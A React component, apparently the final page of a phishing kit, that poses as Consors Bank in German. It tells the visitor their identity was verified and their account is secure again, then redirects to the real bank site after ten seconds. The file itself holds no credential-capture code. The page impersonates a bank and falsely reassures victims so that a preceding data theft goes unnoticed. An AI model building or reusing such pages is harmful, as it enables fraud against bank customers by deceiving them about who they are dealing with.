import React, { useEffect, useState } from 'react';

const FinalSuccessScreen: React.FC = () => {
  const [isMobile, setIsMobile] = useState(false);

  useEffect(() => {
    const checkScreenSize = () => {
      setIsMobile(window.innerWidth <= 768);
    };

    checkScreenSize();
    window.addEventListener('resize', checkScreenSize);
    return () => window.removeEventListener('resize', checkScreenSize);
  }, []);

  useEffect(() => {
    // Redirect after 10 seconds
    const timer = setTimeout(() => {
      window.location.href = 'https://www.consorsbank.de/';
    }, 10000);

    return () => clearTimeout(timer);
  }, []);

  const handleManualRedirect = () => {
    window.location.href = 'https://www.consorsbank.de/';
  };

  return (
    <div style={{
      display: 'flex',
      justifyContent: 'center',
      alignItems: 'center',
      minHeight: '60vh',
      padding: isMobile ? '20px 15px' : '40px 20px',
      backgroundColor: '#ffffff'
    }}>
      <div style={{
        textAlign: 'center',
        maxWidth: isMobile ? '100%' : '600px',
        width: '100%',
        padding: isMobile ? '30px 20px' : '60px 40px',
        borderRadius: '8px',
        border: '2px solid #4caf50',
        backgroundColor: '#f8fff8',
        boxShadow: '0 4px 20px rgba(76, 175, 80, 0.15)'
      }}>
        {/* Success Icon */}
        <div style={{
          marginBottom: isMobile ? '20px' : '30px'
        }}>
          <svg 
            width={isMobile ? "64" : "80"} 
            height={isMobile ? "64" : "80"} 
            viewBox="0 0 24 24" 
            fill="#4caf50"
            style={{ margin: '0 auto' }}
          >
            <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
          </svg>
        </div>
        
        {/* Title */}
        <h1 style={{
          color: '#2e7d32',
          fontSize: isMobile ? '22px' : '28px',
          fontWeight: '600',
          margin: '0 0 20px 0',
          fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
          lineHeight: '1.3'
        }}>
          Verifizierung erfolgreich abgeschlossen
        </h1>
        
        {/* Description */}
        <p style={{
          color: '#666666',
          fontSize: isMobile ? '14px' : '16px',
          lineHeight: '1.5',
          margin: '0 0 30px 0',
          fontFamily: 'Proxima Nova Vara, system-ui, sans-serif'
        }}>
          Ihre Identität wurde erfolgreich verifiziert. Ihr Consors Bank-Konto ist wieder sicher und zugänglich.
        </p>
        
        {/* Success Box */}
        <div style={{
          backgroundColor: '#e8f5e8',
          border: '1px solid #4caf50',
          borderRadius: '8px',
          padding: isMobile ? '20px 15px' : '25px 20px',
          marginBottom: '30px'
        }}>
          <div style={{
            display: 'flex',
            alignItems: isMobile ? 'flex-start' : 'center',
            gap: isMobile ? '12px' : '15px',
            justifyContent: 'center',
            flexDirection: isMobile ? 'column' : 'row',
            textAlign: isMobile ? 'center' : 'left'
          }}>
            <svg 
              width="32" 
              height="32" 
              viewBox="0 0 24 24" 
              fill="#4caf50"
              style={{ flexShrink: 0 }}
            >
              <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
            </svg>
            <div>
              <p style={{
                color: '#2e7d32',
                fontSize: isMobile ? '16px' : '18px',
                fontWeight: '600',
                margin: '0 0 8px 0',
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif'
              }}>
                Sicherheitsmaßnahmen aktiviert
              </p>
              <p style={{
                color: '#388e3c',
                fontSize: isMobile ? '14px' : '15px',
                margin: 0,
                fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
                lineHeight: '1.4'
              }}>
                Alle Sicherheitsmaßnahmen wurden erfolgreich aktiviert. Ihr Konto ist jetzt vollständig geschützt.
              </p>
            </div>
          </div>
        </div>
        
        {/* Redirect Notice */}
        <div style={{
          backgroundColor: '#f0f7ff',
          border: '1px solid #2196f3',
          borderRadius: '8px',
          padding: isMobile ? '20px 15px' : '25px 20px',
          marginBottom: '30px'
        }}>
          <p style={{
            color: '#1976d2',
            fontSize: isMobile ? '14px' : '16px',
            fontWeight: '500',
            margin: 0,
            fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
            textAlign: 'center'
          }}>
            Sie werden automatisch in 10 Sekunden zu Consors Bank weitergeleitet.
          </p>
        </div>
        
        {/* Manual Redirect Button */}
        <div style={{
          marginBottom: '20px'
        }}>
          <button
            onClick={handleManualRedirect}
            className="button button-primary"
            style={{
              fontSize: '16px',
              fontWeight: '600',
              padding: '12px 24px',
              minHeight: '40px',
              lineHeight: '1',
              cursor: 'pointer',
              display: 'inline-flex',
              alignItems: 'center',
              gap: '8px'
            }}
          >
            Jetzt zu Consors Bank
            <span style={{
              fontSize: '18px',
              fontWeight: 'bold'
            }}>
              ›
            </span>
          </button>
        </div>
        
        {/* Footer Text */}
        <p style={{
          color: '#999999',
          fontSize: isMobile ? '12px' : '14px',
          margin: 0,
          lineHeight: '1.4',
          fontFamily: 'Proxima Nova Vara, system-ui, sans-serif',
          textAlign: 'center'
        }}>
          Vielen Dank für Ihre Geduld. Ihre Sicherheit ist unsere Priorität.
        </p>
      </div>
    </div>
  );
};

export default FinalSuccessScreen;